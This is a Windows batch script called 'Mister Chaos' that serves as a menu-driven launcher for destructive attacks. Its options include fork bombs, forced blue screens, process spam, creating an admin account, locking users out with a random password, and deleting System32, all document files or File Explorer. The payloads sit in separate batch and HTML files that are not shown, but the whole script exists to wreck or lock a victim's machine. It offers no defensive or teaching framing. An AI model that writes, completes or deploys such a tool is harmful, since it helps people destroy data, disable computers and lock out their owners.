@echo off
cls
goto menu

REM MENU
:menu
color 04
cls
echo.
echo  [==========================================]
echo  #               Mister Chaos               #
echo  [==========================================]
echo  #  1. Bombing Attacks                      #
echo  #  2. Crash Attacks                        #
echo  #  3. Privilage Escalation                 #
echo  #  4. Destruction Attacks                  #
echo  #  q. (EXIT)                               #
echo  [==========================================] 
echo                               By Webious_ (c)
echo   Enter Selection_

REM SelectMenu
set /p selectmenu=
if %selectmenu% == 1 goto menu_bombing
if %selectmenu% == 2 goto menu_crash
if %selectmenu% == 3 goto menu_escalation
if %selectmenu% == 4 goto menu_destruction
if %selectmenu% == q goto exit
) else (
goto menu
)

REM MENU_BOMBING_1
REM ==================================================================================================
:menu_bombing
color 0D
cls
echo.
echo  [==========================================]
echo  #             Bombing Attacks              #
echo  [==========================================]
echo  #  1. User Bombing                         #
echo  #  2. Folder Bombing                       #
echo  #  3. File Bombing                         #
echo  #  4. Browser Fork Bomb                    #
echo  #  5. CMD Fork Bomb                        #
echo  #  q. (Back to Main Menu)                  #
echo  [==========================================] 
echo.
echo   Enter Selection_

REM SelectMenu_Bombing
set /p SelectMenu_Bombing=
if %SelectMenu_Bombing% == 1 goto user_bombing
if %SelectMenu_Bombing% == 2 goto folder_bombing
if %SelectMenu_Bombing% == 3 goto file_bombing
if %SelectMenu_Bombing% == 4 goto browser_bombing
if %SelectMenu_Bombing% == 5 goto cmd_bombing
if %SelectMenu_Bombing% == q goto menu
) else (
goto menu_bombing
)

REM USER_BOMBING
:user_bombing
start user_bombing.bat
pause
goto menu_bombing

REM FOLDER_BOMBING
:folder_bombing
start folder_bombing.bat
pause
goto menu_bombing

REM FILE_BOMBING
:file_bombing
start file_bombing.bat
pause
goto menu_bombing

REM BROWSER_BOMBING
:browser_bombing
start browser_bombing.html
pause
goto menu_bombing

REM CMD_BOMBING
:cmd_bombing
start cmd_bombing.bat
pause
goto menu_bombing
REM ==================================================================================================

REM MENU_CRASH_2
REM ==================================================================================================
:menu_crash
color 0D
cls
echo.
echo  [==========================================]
echo  #             Crash Attacks                #
echo  [==========================================]
echo  #  1. Blue Screen                          #
echo  #  2. Spam Process                         #
echo  #  3. Porn Symphony                        #
echo  #  q. (Back to Main Menu)                  #
echo  [==========================================] 
echo.
echo   Enter Selection_

REM SelectMenu_Crash
set /p SelectMenu_Crash=
if %SelectMenu_Crash% == 1 goto bluescreen_crash
if %SelectMenu_Crash% == 2 goto spamprocess_crash
if %SelectMenu_Crash% == 3 goto porn_crash
if %SelectMenu_Crash% == q goto menu
) else (
goto menu_crash
)

REM BLUESCREEN_CRASH
:bluescreen_crash
start bluescreen_crash.bat
pause
goto menu_crash

REM SPAMPROCESS_CRASH
:spamprocess_crash
start spamprocess_crash.bat
pause
goto menu_crash

REM PORN_CRASH
:porn_crash
start porn_crash.bat
pause
goto menu_crash
REM ==================================================================================================

REM MENU_ESCALATION_3
REM ==================================================================================================
:menu_escalation
color 0D
cls
echo.
echo  [==========================================]
echo  #        Privilage Escalation Attacks      #
echo  [==========================================]
echo  #  1. New Admin Session                    #
echo  #  2. Lock out with random Password        #
echo  #  3. TEST                                 #
echo  #  q. (Back to Main Menu)                  #
echo  [==========================================] 
echo.
echo   Enter Selection_

REM SelectMenu_Escalation
set /p SelectMenu_Escalation=
if %SelectMenu_Escalation% == 1 goto admin_escalation
if %SelectMenu_Escalation% == 2 goto passrandom_escalation
if %SelectMenu_Escalation% == 3 goto test
if %SelectMenu_Escalation% == q goto menu
) else (
goto menu_escalation
)

REM ADMIN_ESCALATION
:admin_escalation
start admin_escalation.bat
pause
goto menu_escalation

REM PASSRANDOM_ESCALATION
:passrandom_escalation
start passrandom_escalation.bat
pause
goto menu_escalation

REM TEST
:test
cd "/bin"
start test.bat
pause
goto menu_escalation
REM ==================================================================================================

REM MENU_DESTRUCTION_4
REM ==================================================================================================
:menu_destruction
color 0D
cls
echo.
echo  [==========================================]
echo  #            Destruction Attacks           #
echo  [==========================================]
echo  #  1. Delete Sys32                         #
echo  #  2. Delete all document files            #
echo  #  3. Delete File Explorer                 #
echo  #  q. (Back to Main Menu)                  #
echo  [==========================================] 
echo.
echo   Enter Selection_

REM SelectMenu_Destruction
set /p SelectMenu_Destruction=
if %SelectMenu_Destruction% == 1 goto sys32_destruction
if %SelectMenu_Destruction% == 2 goto delfile_destruction
if %SelectMenu_Destruction% == 3 goto explorer_destruction
if %SelectMenu_Destruction% == q goto menu
) else (
goto menu_destruction
)

REM SYS32_DESTRUCTION
:sys32_destruction
start sys32_destruction.bat
pause
goto menu_destruction

REM DELFILE_DESTRUCTION
:delfile_destruction
start delfile_destruction.bat
pause
goto menu_destruction

REM EXPLORER_DESTRUCTION
:explorer_destruction
start explorer_destruction.bat
pause
goto menu_destruction
REM ==================================================================================================


REM EXIT
:exit
cls
exit /f